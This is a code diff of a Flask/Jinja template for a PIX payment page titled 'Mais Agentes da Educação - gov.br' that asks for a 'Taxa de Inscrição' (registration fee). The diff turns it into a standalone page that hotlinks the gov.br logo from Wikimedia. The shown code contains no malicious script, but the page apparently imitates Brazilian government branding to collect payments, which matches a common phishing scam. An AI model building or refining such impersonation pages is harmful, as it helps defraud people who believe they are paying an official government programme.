@@ -1,8 +1,37 @@
-{% extends "base.html" %}
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>{{ page_title or "Pagamento PIX - Mais Agentes da Educação - gov.br" }}</title>
+    
+    <!-- External CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+    <link href="https://fonts.cdnfonts.com/css/rawline" rel="stylesheet">
+    
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/custom.css') }}">
+    
+    <!-- Favicon -->
+    <link rel="icon" type="image/x-icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🇧🇷</text></svg>">
+</head>
+<body class="bg-white">
+    <!-- Header Simplificado -->
+    <header class="header-govbr">
+        <div class="flex justify-between items-center px-4 py-3">
+            <div class="flex items-center">
+                <a href="{{ url_for('index') }}" class="gov-logo">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/11/Gov.br_logo.svg/1200px-Gov.br_logo.svg.png" 
+                         alt="gov.br" 
+                         class="h-8">
+                </a>
+            </div>
+        </div>
+    </header>
 
-{% block title %}{{ page_title or "Pagamento PIX - Mais Agentes da Educação - gov.br" }}{% endblock %}
-
-{% block content %}
+    <!-- Main Content -->
+    <main class="container mx-auto max-w-4xl">
 <div class="px-4 py-4">
     <h1 class="text-3xl font-semibold mb-4 text-black">Taxa de Inscrição</h1>
     
@@ -283,4 +312,10 @@ function mostrarErro(mensagem) {
     `;
 }
 </script>
-{% endblock %}
+
+    </main>
+
+    <!-- JavaScript do gov.br -->
+    <script src="{{ url_for('static', filename='js/main.js') }}"></script>
+</body>
+</html>
